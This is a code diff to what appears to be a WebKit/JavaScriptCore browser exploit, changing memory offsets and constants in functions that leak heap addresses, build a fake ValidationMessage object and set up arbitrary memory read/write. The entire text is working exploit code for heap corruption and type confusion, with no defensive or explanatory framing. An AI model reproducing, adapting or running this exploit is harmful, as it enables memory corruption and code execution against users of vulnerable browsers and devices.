@@ -61,7 +61,7 @@ function setupRW() {
 	debug_log("[+] Setting up arbitrary R/W");
 
 	/* Retrieving the ArrayBuffer address using the relative read */
-	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
+	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 2;
 	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
@@ -269,7 +269,7 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x13) === 0x42)
 					v = new Int64(str2array(g_relative_read, 8, i + 8));
 			}
-			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
+			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x1) {
 				g_jsview_leak = v;
 				props = null;
 				break;
@@ -302,7 +302,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 2 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
@@ -367,7 +367,7 @@ function findTargetObj() {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
 				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
 				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
 				g_round++;
